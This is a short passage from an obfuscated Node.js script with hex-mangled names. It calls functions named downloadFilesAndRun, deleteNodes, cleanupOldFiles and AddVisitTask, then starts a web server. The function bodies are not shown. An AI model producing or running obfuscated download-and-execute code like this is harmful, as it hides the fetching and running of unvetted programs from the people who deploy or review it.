_0x495fa3=_0x5d2a16;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x53f907){console[_0x495fa3(0x1c5)](_0x495fa3(0x1d9),_0x53f907);}}startserver()[_0x5d2a16(0x214)](_0x4c117f=>{const _0x5a8434=_0x5d2a16;console['error'](_0x5a8434(0x226),_0x4c117f);}),app[_0x5d2a16(0x23e)](PORT,()=>console[_0x5d2a16(0x260)](_0x5d2a16(0x261)+PORT+'!'));
